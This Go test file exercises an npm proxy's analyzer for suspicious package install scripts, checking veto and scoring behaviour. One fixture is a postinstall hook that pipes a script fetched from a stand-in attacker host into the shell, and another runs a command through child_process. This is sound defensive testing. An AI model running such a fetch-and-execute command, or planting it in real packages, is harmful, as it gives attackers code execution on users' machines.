package layer2

import (
	"context"
	"testing"

	"github.com/yourusername/npm-proxy/internal/extractor"
)

func mkTree(scriptsJSON string) extractor.FileTree {
	return extractor.FileTree{
		"package/package.json": []byte(`{"name":"x","version":"1.0.0","scripts":` + scriptsJSON + `}`),
	}
}

func TestInstallScripts_CurlPipeVetos(t *testing.T) {
	a := NewInstallScriptAnalyzer(Scores{
		Present:        0.20,
		Base64:         0.35,
		ChildProcess:   0.20,
		Eval:           0.15,
		NodeEval:       0.15,
		DynamicRequire: 0.10,
		ExternalURL:    0.08,
	})
	tree := mkTree(`{"postinstall":"curl http://evil.com/x.sh | sh"}`)
	sigs := a.Analyze(context.Background(), tree)
	found := false
	for _, s := range sigs {
		if s.Veto {
			found = true
			break
		}
	}
	if !found {
		t.Errorf("expected veto for curl|sh, got %+v", sigs)
	}
}

func TestInstallScripts_ChildProcessScored(t *testing.T) {
	a := NewInstallScriptAnalyzer(Scores{
		Present:        0.20,
		Base64:         0.35,
		ChildProcess:   0.20,
		Eval:           0.15,
		NodeEval:       0.15,
		DynamicRequire: 0.10,
		ExternalURL:    0.08,
	})
	tree := mkTree(`{"postinstall":"node -e \"require('child_process').exec('uname')\""}`)
	sigs := a.Analyze(context.Background(), tree)
	if len(sigs) == 0 {
		t.Fatalf("expected signals, got none")
	}
	for _, s := range sigs {
		if s.Veto {
			t.Errorf("child_process alone should not veto, got %+v", s)
		}
	}
}

func TestInstallScripts_CleanScriptPresent(t *testing.T) {
	a := NewInstallScriptAnalyzer(Scores{
		Present:        0.20,
		Base64:         0.35,
		ChildProcess:   0.20,
		Eval:           0.15,
		NodeEval:       0.15,
		DynamicRequire: 0.10,
		ExternalURL:    0.08,
	})
	tree := mkTree(`{"postinstall":"node dist/build.js"}`)
	sigs := a.Analyze(context.Background(), tree)
	if len(sigs) != 1 || sigs[0].Rule != "install_script_present" {
		t.Errorf("expected install_script_present, got %+v", sigs)
	}
}

func TestInstallScripts_NoScriptsNoSignal(t *testing.T) {
	a := NewInstallScriptAnalyzer(Scores{
		Present:        0.20,
		Base64:         0.35,
		ChildProcess:   0.20,
		Eval:           0.15,
		NodeEval:       0.15,
		DynamicRequire: 0.10,
		ExternalURL:    0.08,
	})
	tree := mkTree(`{}`)
	if sigs := a.Analyze(context.Background(), tree); len(sigs) != 0 {
		t.Errorf("expected no signals for clean package, got %+v", sigs)
	}
}
